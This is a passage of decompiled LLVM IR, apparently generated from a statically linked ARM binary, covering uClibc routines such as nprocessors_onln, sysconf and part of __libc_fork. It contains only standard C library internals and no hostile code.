  %v2_1ccf0 = add i32 %v0_1ccf0, 676
  %v3_1ccf0 = inttoptr i32 %v2_1ccf0 to i32*
  %v4_1ccf0 = load i32, i32* %v3_1ccf0, align 4
  %v2_1ccf8 = icmp eq i32 %v4_1ccf0, 0
  br i1 %v2_1ccf8, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v1_1ccfc = load i32, i32* @r6, align 4
  store i32 %v1_1ccfc, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_1cd04 = xor i1 %v2_1ccf8, true
  call void @__pseudo_cond_branch(i1 %v2_1cd04, i32 %v4_1ccf0)
  store i32 %v2_1ccb4, i32* @r0, align 4
  %v0_1cd14 = load i32, i32* @r5, align 4
  %v2_1cd14 = add i32 %v0_1cd14, 44
  %v3_1cd14 = inttoptr i32 %v2_1cd14 to i32*
  %v4_1cd14 = load i32, i32* %v3_1cd14, align 4
  call void @__pseudo_branch(i32 %v4_1cd14)
  %v0_1cd20 = call i32 @__GI___uClibc_fini()
  store i32 %v0_1cd20, i32* %r0.global-to-local, align 4
  %v0_1cd28 = load i32, i32* @r5, align 4
  %v2_1cd28 = add i32 %v0_1cd28, -50556
  %v2_1cd30 = icmp eq i32 %v2_1cd28, 0
  br i1 %v2_1cd30, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_1cd38 = xor i1 %v2_1cd30, true
  call void @__pseudo_cond_branch(i1 %v2_1cd38, i32 %v2_1cd28)
  %v0_1cd3c = load i32, i32* @r6, align 4
  store i32 %v0_1cd3c, i32* %r0.global-to-local, align 4
  %v1_1cd40 = call i32 @__GI__exit(i32 %v0_1cd3c)
  store i32 %v1_1cd40, i32* %r0.global-to-local, align 4
  %v0_1cd44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1cd44, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v3_1cd44 = udiv i32 %v1_1cd40, 64
  %v4_1cd44 = mul i32 %v1_1cd40, 67108864
  %v5_1cd44 = or i32 %v3_1cd44, %v4_1cd44
  %v8_1cd44 = and i32 %v5_1cd44, %v1_1cd40
  call void @__pseudo_branch(i32 %v8_1cd44)
  %v0_1cd48.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1cd48.pr, label %bb11, label %..thread6_crit_edge

..thread6_crit_edge:                              ; preds = %bb10
  %v4_1cd5c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread6

bb11:                                             ; preds = %bb10
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %..thread6_crit_edge, %bb9, %bb11
  %v4_1cd5c = phi i32 [ %v4_1cd5c.pre, %..thread6_crit_edge ], [ %v1_1cd40, %bb9 ], [ 0, %bb11 ]
  ret i32 %v4_1cd5c

; uselistorder directives
  uselistorder i32 %v1_1cd40, { 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 4, 2, 8, 5, 6, 7, 0 }
  uselistorder label %.thread6, { 2, 0, 1 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -35348), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_1cd84 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -35348))
  store i32 %v1_1cd84, i32* @r6, align 4
  %v2_1cd88 = icmp eq i32 %v1_1cd84, 0
  br i1 %v2_1cd88, label %dec_label_pc_1ce08, label %dec_label_pc_1cd90

dec_label_pc_1cd90:                               ; preds = %entry
  store i32 284, i32* @sl, align 4
  %v0_1cd98 = load i32, i32* @r4, align 4
  %v2_1cd98 = add i32 %v0_1cd98, -35336
  store i32 %v2_1cd98, i32* @r8, align 4
  %v2_1cd9c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1cd9c, i32* @r7, align 4
  br label %bb18

dec_label_pc_1cda4:                               ; preds = %bb18
  %v3_1cda4 = load i32, i32* %stack_var_-36, align 4
  %v1_1cda8 = inttoptr i32 %v3_1cda4 to i32*
  %v2_1cda8 = load i32, i32* %v1_1cda8, align 4
  %v1_1cdac = inttoptr i32 %v2_1cda8 to i8*
  %v2_1cdac = load i8, i8* %v1_1cdac, align 1
  %v7_1cdb0 = icmp eq i8 %v2_1cdac, 99
  br i1 %v7_1cdb0, label %dec_label_pc_1cdb8, label %.backedge3

dec_label_pc_1cdb8:                               ; preds = %dec_label_pc_1cda4
  %v1_1cdb8 = add i32 %v2_1cda8, 1
  %v2_1cdb8 = inttoptr i32 %v1_1cdb8 to i8*
  %v3_1cdb8 = load i8, i8* %v2_1cdb8, align 1
  %v7_1cdbc = icmp eq i8 %v3_1cdb8, 112
  br i1 %v7_1cdbc, label %dec_label_pc_1cdc4, label %.backedge3

dec_label_pc_1cdc4:                               ; preds = %dec_label_pc_1cdb8
  %v1_1cdc4 = add i32 %v2_1cda8, 2
  %v2_1cdc4 = inttoptr i32 %v1_1cdc4 to i8*
  %v3_1cdc4 = load i8, i8* %v2_1cdc4, align 1
  %v7_1cdc8 = icmp eq i8 %v3_1cdc4, 117
  br i1 %v7_1cdc8, label %dec_label_pc_1cdd0, label %.backedge3

dec_label_pc_1cdd0:                               ; preds = %dec_label_pc_1cdc4
  %v1_1cdd0 = add i32 %v2_1cda8, 3
  %v2_1cdd0 = inttoptr i32 %v1_1cdd0 to i8*
  %v3_1cdd0 = load i8, i8* %v2_1cdd0, align 1
  %v4_1cdd0 = zext i8 %v3_1cdd0 to i32
  %v0_1cdd4 = load i32, i32* @r4, align 4
  %v1_1cdd4 = load i32, i32* @sl, align 4
  %v2_1cdd4 = add i32 %v1_1cdd4, %v0_1cdd4
  %v3_1cdd4 = inttoptr i32 %v2_1cdd4 to i32*
  %v4_1cdd4 = load i32, i32* %v3_1cdd4, align 4
  %v2_1cdd8 = mul nuw nsw i32 %v4_1cdd0, 2
  %v2_1cddc = add i32 %v4_1cdd4, %v2_1cdd8
  %v3_1cddc = inttoptr i32 %v2_1cddc to i16*
  %v4_1cddc = load i16, i16* %v3_1cddc, align 2
  %v1_1cde0 = and i16 %v4_1cddc, 8
  %v2_1cde0 = icmp eq i16 %v1_1cde0, 0
  br i1 %v2_1cde0, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_1cdd0
  %v1_1cde4 = load i32, i32* @r5, align 4
  %v2_1cde4 = add i32 %v1_1cde4, 1
  store i32 %v2_1cde4, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_1cdd0, %dec_label_pc_1cda4, %dec_label_pc_1cdb8, %dec_label_pc_1cdc4
  %v0_1cde8.pre = load i32, i32* @r6, align 4
  %v0_1cdf4.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_1cd90
  %v0_1cdf4 = phi i32 [ %v0_1cdf4.pre, %.backedge3 ], [ %v2_1cd98, %dec_label_pc_1cd90 ]
  %v0_1cde8 = phi i32 [ %v0_1cde8.pre, %.backedge3 ], [ %v1_1cd84, %dec_label_pc_1cd90 ]
  %v4_1cdf8 = inttoptr i32 %v0_1cde8 to i32*
  %v5_1cdf8 = call i32 @__GI_config_read(i32* %v4_1cdf8, i32 %v2_1cd9c, i32 258, i32 %v0_1cdf4)
  %v2_1cdfc = icmp eq i32 %v5_1cdf8, 0
  br i1 %v2_1cdfc, label %dec_label_pc_1ce6c, label %dec_label_pc_1cda4

dec_label_pc_1ce08:                               ; preds = %entry
  %v0_1ce0c = load i32, i32* @r4, align 4
  %v2_1ce0c = add i32 %v0_1ce0c, -35332
  store i32 %v2_1ce0c, i32* @r0, align 4
  %v1_1ce10 = call i32 @__GI_config_open(i32 %v2_1ce0c)
  store i32 %v1_1ce10, i32* @r6, align 4
  %v2_1ce14 = icmp eq i32 %v1_1ce10, 0
  br i1 %v2_1ce14, label %bb19, label %dec_label_pc_1ce20

bb19:                                             ; preds = %dec_label_pc_1ce08
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1ce6c

dec_label_pc_1ce20:                               ; preds = %dec_label_pc_1ce08
  %v0_1ce24 = load i32, i32* @r4, align 4
  %v2_1ce24 = add i32 %v0_1ce24, -35316
  store i32 %v2_1ce24, i32* @r8, align 4
  %v2_1ce2c = add i32 %v0_1ce24, -35280
  store i32 %v2_1ce2c, i32* @r7, align 4
  %v2_1ce30 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1ce30, i32* @r4, align 4
  br label %bb21

dec_label_pc_1ce38:                               ; preds = %bb21
  %v0_1ce64 = load i32, i32* @r8, align 4
  %v3_1ce38 = load i32, i32* %stack_var_-36, align 4
  %v1_1ce3c = inttoptr i32 %v3_1ce38 to i32*
  %v2_1ce3c = load i32, i32* %v1_1ce3c, align 4
  store i32 %v2_1ce3c, i32* @r1, align 4
  %v2_1ce40 = inttoptr i32 %v0_1ce64 to i8*
  %v3_1ce40 = call i32 @__GI_strcoll(i8* %v2_1ce40, i32 %v2_1ce3c)
  %v2_1ce44 = icmp eq i32 %v3_1ce40, 0
  br i1 %v2_1ce44, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_1ce38
  %v1_1ce48 = load i32, i32* @r5, align 4
  %v2_1ce48 = add i32 %v1_1ce48, 1
  store i32 %v2_1ce48, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_1ce38
  %v0_1ce54.pre = load i32, i32* @r7, align 4
  %v0_1ce58.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_1ce20
  %v0_1ce58 = phi i32 [ %v0_1ce58.pre, %.backedge ], [ %v1_1ce10, %dec_label_pc_1ce20 ]
  %v0_1ce54 = phi i32 [ %v0_1ce54.pre, %.backedge ], [ %v2_1ce2c, %dec_label_pc_1ce20 ]
  %v4_1ce5c = inttoptr i32 %v0_1ce58 to i32*
  %v5_1ce5c = call i32 @__GI_config_read(i32* %v4_1ce5c, i32 %v2_1ce30, i32 459266, i32 %v0_1ce54)
  %v2_1ce60 = icmp eq i32 %v5_1ce5c, 0
  br i1 %v2_1ce60, label %dec_label_pc_1ce6c, label %dec_label_pc_1ce38

dec_label_pc_1ce6c:                               ; preds = %bb18, %bb21, %bb19
  %v0_1ce6c = load i32, i32* @r6, align 4
  %v1_1ce70 = inttoptr i32 %v0_1ce6c to i32*
  %v2_1ce70 = call i32 @__GI_config_close(i32* %v1_1ce70)
  %v0_1ce74 = load i32, i32* @r5, align 4
  %v2_1ce74 = icmp eq i32 %v0_1ce74, 0
  %.v0_1ce74 = select i1 %v2_1ce74, i32 1, i32 %v0_1ce74
  ret i32 %.v0_1ce74

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_1ce6c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_1d2a0

bb:                                               ; preds = %entry
  %v7_1cec4 = mul i32 %arg1, 4
  %v8_1cec4 = add i32 %v7_1cec4, ptrtoint (i32* @global_var_1cecc.561 to i32)
  call void @__pseudo_branch(i32 %v8_1cec4)
  br label %dec_label_pc_1d2a0

dec_label_pc_1d2a0:                               ; preds = %bb, %entry
  %v0_1d2a4 = call i32 @__aeabi_read_tp()
  %v3_1d2a8 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1d2a8 = sext i16 %v3_1d2a8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1d2b4 = add i32 %v4_1d2a8, %v0_1d2a4
  %v4_1d2b4 = inttoptr i32 %v3_1d2b4 to i32*
  store i32 22, i32* %v4_1d2b4, align 4
  %v0_1d498 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_1d498

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 14004, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r8.global-to-local, align 4
  %v4_1d5c416 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14004) to i32*), align 4
  store i32 %v4_1d5c416, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d5c818 = icmp eq i32 %v4_1d5c416, 0
  br i1 %v2_1d5c818, label %dec_label_pc_1d5d0, label %dec_label_pc_1d4f4

dec_label_pc_1d4f4:                               ; preds = %entry, %dec_label_pc_1d5c4.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_1d500 = load i32, i32* %r7.global-to-local, align 4
  %v1_1d500 = add i32 %v0_1d500, 20
  %v2_1d500 = inttoptr i32 %v1_1d500 to i32*
  %v3_1d500 = load i32, i32* %v2_1d500, align 4
  store i32 %v3_1d500, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d504 = icmp eq i32 %v3_1d500, 0
  store i32 %v3_1d500, i32* %r4.global-to-local, align 4
  br i1 %v2_1d504, label %dec_label_pc_1d5c4.backedge, label %dec_label_pc_1d514

dec_label_pc_1d5c4.backedge:                      ; preds = %dec_label_pc_1d4f4, %dec_label_pc_1d540
  %v0_1d5c4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1d5c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1d5c4 = add i32 %v1_1d5c4, %v0_1d5c4
  %v3_1d5c4 = inttoptr i32 %v2_1d5c4 to i32*
  %v4_1d5c4 = load i32, i32* %v3_1d5c4, align 4
  store i32 %v4_1d5c4, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d5c8 = icmp eq i32 %v4_1d5c4, 0
  br i1 %v2_1d5c8, label %dec_label_pc_1d5d0, label %dec_label_pc_1d4f4

dec_label_pc_1d514:                               ; preds = %dec_label_pc_1d4f4
  %v0_1d514 = load i32, i32* %r8.global-to-local, align 4
  %v1_1d514 = load i32, i32* %r5.global-to-local, align 4
  %v2_1d514 = add i32 %v1_1d514, %v0_1d514
  %v3_1d514 = inttoptr i32 %v2_1d514 to i32*
  %v4_1d514 = load i32, i32* %v3_1d514, align 4
  %v1_1d518 = add i32 %v4_1d514, 20
  store i32 %v1_1d518, i32* %r2.global-to-local, align 4
  %v1_1d51c132 = inttoptr i32 %v1_1d518 to i32*
  %v2_1d51c133 = load i32, i32* %v1_1d51c132, align 4
  store i32 %v2_1d51c133, i32* %r3.global-to-local, align 4
  %v3_1d520135 = icmp uge i32 %v2_1d51c133, %v3_1d500
  store i1 %v3_1d520135, i1* %cpsr_c.global-to-local, align 1
  %v9_1d520141 = icmp eq i32 %v2_1d51c133, %v3_1d500
  br i1 %v9_1d520141, label %dec_label_pc_1d528, label %dec_label_pc_1d540

dec_label_pc_1d528:                               ; preds = %dec_label_pc_1d514, %dec_label_pc_1d528.dec_label_pc_1d51c_crit_edge
  %v0_1d528142 = phi i32 [ %v1_1d520.pre, %dec_label_pc_1d528.dec_label_pc_1d51c_crit_edge ], [ %v3_1d500, %dec_label_pc_1d514 ]
  store i32 %v0_1d528142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1d538 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d538, label %dec_label_pc_1d53c, label %dec_label_pc_1d528.dec_label_pc_1d51c_crit_edge

dec_label_pc_1d528.dec_label_pc_1d51c_crit_edge:  ; preds = %dec_label_pc_1d528
  %v0_1d51c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1d520.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1d51c = inttoptr i32 %v0_1d51c.pre to i32*
  %v2_1d51c = load i32, i32* %v1_1d51c, align 4
  store i32 %v2_1d51c, i32* %r3.global-to-local, align 4
  %v3_1d520 = icmp uge i32 %v2_1d51c, %v1_1d520.pre
  store i1 %v3_1d520, i1* %cpsr_c.global-to-local, align 1
  %v9_1d520 = icmp eq i32 %v2_1d51c, %v1_1d520.pre
  br i1 %v9_1d520, label %dec_label_pc_1d528, label %dec_label_pc_1d540

dec_label_pc_1d53c:                               ; preds = %dec_label_pc_1d528
  %v0_1d53c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1d53c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d540

dec_label_pc_1d540:                               ; preds = %dec_label_pc_1d514, %dec_label_pc_1d528.dec_label_pc_1d51c_crit_edge, %dec_label_pc_1d53c
  %v0_1d540 = phi i32 [ %v0_1d53c, %dec_label_pc_1d53c ], [ %v2_1d51c133, %dec_label_pc_1d514 ], [ %v2_1d51c, %dec_label_pc_1d528.dec_label_pc_1d51c_crit_edge ]
  %v1_1d540 = phi i32 [ %v0_1d53c, %dec_label_pc_1d53c ], [ %v3_1d500, %dec_label_pc_1d514 ], [ %v1_1d520.pre, %dec_label_pc_1d528.dec_label_pc_1d51c_crit_edge ]
  %v3_1d540 = icmp uge i32 %v0_1d540, %v1_1d540
  store i1 %v3_1d540, i1* %cpsr_c.global-to-local, align 1
  %v9_1d540 = icmp eq i32 %v0_1d540, %v1_1d540
  br i1 %v9_1d540, label %dec_label_pc_1d548, label %dec_label_pc_1d5c4.backedge

dec_label_pc_1d548:                               ; preds = %dec_label_pc_1d540
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1d55c = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_1d54c

dec_label_pc_1d54c:                               ; preds = %dec_label_pc_1d5b4, %dec_label_pc_1d548
  %v0_1d54c = load i32, i32* %r7.global-to-local, align 4
  %v1_1d54c = add i32 %v0_1d54c, 4
  %v2_1d54c = inttoptr i32 %v1_1d54c to i32*
  %v3_1d54c = load i32, i32* %v2_1d54c, align 4
  store i32 %v3_1d54c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d550 = icmp eq i32 %v3_1d54c, 0
  br i1 %v2_1d550, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_1d54c
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_1d54c, %bb
  %v2_1d558 = xor i1 %v2_1d550, true
  call void @__pseudo_cond_branch(i1 %v2_1d558, i32 %v3_1d54c)
  %v0_1d560 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1d560, i32* %stack_var_-88, align 4
  %v1_1d564 = inttoptr i32 %v0_1d560 to i32*
  %v2_1d564 = load i32, i32* %v1_1d564, align 4
  store i32 %v2_1d564, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d568 = icmp eq i32 %v2_1d564, 0
  store i32 %v2_1d55c, i32* %r5.global-to-local, align 4
  br i1 %v2_1d568, label %dec_label_pc_1d5d4.loopexit, label %dec_label_pc_1d57c

dec_label_pc_1d57c:                               ; preds = %bb72
  %v1_1d57c = add i32 %v2_1d564, 20
  store i32 %v1_1d57c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1d580

dec_label_pc_1d580:                               ; preds = %dec_label_pc_1d5b4.dec_label_pc_1d580_crit_edge, %dec_label_pc_1d57c
  %v0_1d584 = phi i32 [ %v0_1d584.pre, %dec_label_pc_1d5b4.dec_label_pc_1d580_crit_edge ], [ %v1_1d57c, %dec_label_pc_1d57c ]
  %v0_1d580 = phi i32 [ %v0_1d580.pre, %dec_label_pc_1d5b4.dec_label_pc_1d580_crit_edge ], [ %v2_1d564, %dec_label_pc_1d57c ]
  %v1_1d580 = add i32 %v0_1d580, 20
  %v2_1d580 = inttoptr i32 %v1_1d580 to i32*
  %v3_1d580 = load i32, i32* %v2_1d580, align 4
  store i32 %v0_1d584, i32* %r2.global-to-local, align 4
  store i32 %v3_1d580, i32* %r4.global-to-local, align 4
  %v1_1d590119 = inttoptr i32 %v0_1d584 to i32*
  %v2_1d590120 = load i32, i32* %v1_1d590119, align 4
  store i32 %v2_1d590120, i32* %r3.global-to-local, align 4
  %v3_1d594122 = icmp uge i32 %v2_1d590120, %v3_1d580
  store i1 %v3_1d594122, i1* %cpsr_c.global-to-local, align 1
  %v9_1d594128 = icmp eq i32 %v2_1d590120, %v3_1d580
  br i1 %v9_1d594128, label %dec_label_pc_1d59c, label %dec_label_pc_1d5b4

dec_label_pc_1d59c:                               ; preds = %dec_label_pc_1d580, %dec_label_pc_1d59c.dec_label_pc_1d590_crit_edge
  %v0_1d59c129 = phi i32 [ %v1_1d594.pre, %dec_label_pc_1d59c.dec_label_pc_1d590_crit_edge ], [ %v3_1d580, %dec_label_pc_1d580 ]
  store i32 %v0_1d59c129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1d5ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d5ac, label %dec_label_pc_1d5b0, label %dec_label_pc_1d59c.dec_label_pc_1d590_crit_edge

dec_label_pc_1d59c.dec_label_pc_1d590_crit_edge:  ; preds = %dec_label_pc_1d59c
  %v0_1d590.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1d594.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1d590 = inttoptr i32 %v0_1d590.pre to i32*
  %v2_1d590 = load i32, i32* %v1_1d590, align 4
  store i32 %v2_1d590, i32* %r3.global-to-local, align 4
  %v3_1d594 = icmp uge i32 %v2_1d590, %v1_1d594.pre
  store i1 %v3_1d594, i1* %cpsr_c.global-to-local, align 1
  %v9_1d594 = icmp eq i32 %v2_1d590, %v1_1d594.pre
  br i1 %v9_1d594, label %dec_label_pc_1d59c, label %dec_label_pc_1d5b4

dec_label_pc_1d5b0:                               ; preds = %dec_label_pc_1d59c
  %v0_1d5b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1d5b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d5b4

dec_label_pc_1d5b4:                               ; preds = %dec_label_pc_1d580, %dec_label_pc_1d59c.dec_label_pc_1d590_crit_edge, %dec_label_pc_1d5b0
  %v0_1d5b4 = phi i32 [ %v0_1d5b0, %dec_label_pc_1d5b0 ], [ %v2_1d590120, %dec_label_pc_1d580 ], [ %v2_1d590, %dec_label_pc_1d59c.dec_label_pc_1d590_crit_edge ]
  %v1_1d5b4 = phi i32 [ %v0_1d5b0, %dec_label_pc_1d5b0 ], [ %v3_1d580, %dec_label_pc_1d580 ], [ %v1_1d594.pre, %dec_label_pc_1d59c.dec_label_pc_1d590_crit_edge ]
  %v3_1d5b4 = icmp uge i32 %v0_1d5b4, %v1_1d5b4
  store i1 %v3_1d5b4, i1* %cpsr_c.global-to-local, align 1
  %v9_1d5b4 = icmp eq i32 %v0_1d5b4, %v1_1d5b4
  store i32 %v2_1d55c, i32* %r4.global-to-local, align 4
  br i1 %v9_1d5b4, label %dec_label_pc_1d54c, label %dec_label_pc_1d5b4.dec_label_pc_1d580_crit_edge

dec_label_pc_1d5b4.dec_label_pc_1d580_crit_edge:  ; preds = %dec_label_pc_1d5b4
  %v0_1d580.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1d584.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1d580

dec_label_pc_1d5d0:                               ; preds = %dec_label_pc_1d5c4.backedge, %entry
  %v0_1d5d831 = phi i32 [ ptrtoint (i32* @global_var_2c010.418 to i32), %entry ], [ %v0_1d5c4, %dec_label_pc_1d5c4.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1d5d4

dec_label_pc_1d5d4.loopexit:                      ; preds = %bb72
  store i32 %v2_1d55c, i32* %r6.global-to-local, align 4
  %v0_1d5d8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1d5d4

dec_label_pc_1d5d4:                               ; preds = %dec_label_pc_1d5d4.loopexit, %dec_label_pc_1d5d0
  %v0_1d5d8 = phi i32 [ %v0_1d5d8.pre, %dec_label_pc_1d5d4.loopexit ], [ %v0_1d5d831, %dec_label_pc_1d5d0 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_1d5d8 = add i32 %v0_1d5d8, 152
  %v3_1d5d8 = inttoptr i32 %v2_1d5d8 to i32*
  %v4_1d5d8 = load i32, i32* %v3_1d5d8, align 4
  store i32 %v4_1d5d8, i32* %r7.global-to-local, align 4
  %v0_1d5dc = call i32 @__aeabi_read_tp()
  store i32 %v0_1d5dc, i32* %r0.global-to-local, align 4
  %v1_1d5e0 = add i32 %v4_1d5d8, 8
  %v2_1d5e0 = inttoptr i32 %v1_1d5e0 to i32*
  %v3_1d5e0 = load i32, i32* %v2_1d5e0, align 4
  store i32 %v3_1d5e0, i32* %r3.global-to-local, align 4
  %v1_1d5e4 = add i32 %v0_1d5dc, -1168
  store i32 %v1_1d5e4, i32* %r5.global-to-local, align 4
  %v3_1d5e8 = icmp uge i32 %v3_1d5e0, %v1_1d5e4
  store i1 %v3_1d5e8, i1* %cpsr_c.global-to-local, align 1
  %v9_1d5e8 = icmp eq i32 %v3_1d5e0, %v1_1d5e4
  br i1 %v9_1d5e8, label %dec_label_pc_1d750, label %dec_label_pc_1d5f0

dec_label_pc_1d5f0:                               ; preds = %dec_label_pc_1d5d4
  store i32 %v4_1d5d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1d5fc112 = inttoptr i32 %v4_1d5d8 to i32*
  %v2_1d5fc113 = load i32, i32* %v1_1d5fc112, align 4
  store i32 %v2_1d5fc113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1d600115 = icmp eq i32 %v2_1d5fc113, 0
  br i1 %v9_1d600115, label %dec_label_pc_1d608, label %dec_label_pc_1d620

dec_label_pc_1d608:                               ; preds = %dec_label_pc_1d5f0, %dec_label_pc_1d608.dec_label_pc_1d5fc_crit_edge
  %v0_1d608116 = phi i32 [ %v1_1d600.pre, %dec_label_pc_1d608.dec_label_pc_1d5fc_crit_edge ], [ 0, %dec_label_pc_1d5f0 ]
  store i32 %v0_1d608116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1d618 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d618, label %dec_label_pc_1d61c, label %dec_label_pc_1d608.dec_label_pc_1d5fc_crit_edge

dec_label_pc_1d608.dec_label_pc_1d5fc_crit_edge:  ; preds = %dec_label_pc_1d608
  %v0_1d5fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1d600.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1d5fc = inttoptr i32 %v0_1d5fc.pre to i32*
  %v2_1d5fc = load i32, i32* %v1_1d5fc, align 4
  store i32 %v2_1d5fc, i32* %r3.global-to-local, align 4
  %v3_1d600 = icmp uge i32 %v2_1d5fc, %v1_1d600.pre
  store i1 %v3_1d600, i1* %cpsr_c.global-to-local, align 1
  %v9_1d600 = icmp eq i32 %v2_1d5fc, %v1_1d600.pre
  br i1 %v9_1d600, label %dec_label_pc_1d608, label %dec_label_pc_1d620

dec_label_pc_1d61c:                               ; preds = %dec_label_pc_1d608
  %v0_1d61c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1d61c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d620

dec_label_pc_1d620:                               ; preds = %dec_label_pc_1d5f0, %dec_label_pc_1d608.dec_label_pc_1d5fc_crit_edge, %dec_label_pc_1d61c
  %v0_1d620 = phi i32 [ %v0_1d61c, %dec_label_pc_1d61c ], [ %v2_1d5fc113, %dec_label_pc_1d5f0 ], [ %v2_1d5fc, %dec_label_pc_1d608.dec_label_pc_1d5fc_crit_edge ]
  %v1_1d620 = phi i32 [ %v0_1d61c, %dec_label_pc_1d61c ], [ 0, %dec_label_pc_1d5f0 ], [ %v1_1d600.pre, %dec_label_pc_1d608.dec_label_pc_1d5fc_crit_edge ]
  %v3_1d620 = icmp uge i32 %v0_1d620, %v1_1d620
  store i1 %v3_1d620, i1* %cpsr_c.global-to-local, align 1
  %v9_1d620 = icmp eq i32 %v0_1d620, %v1_1d620
  br i1 %v9_1d620, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_1d620
  %v1_1d624 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1d624, i32* %r0.global-to-local, align 4
  br label %bb74

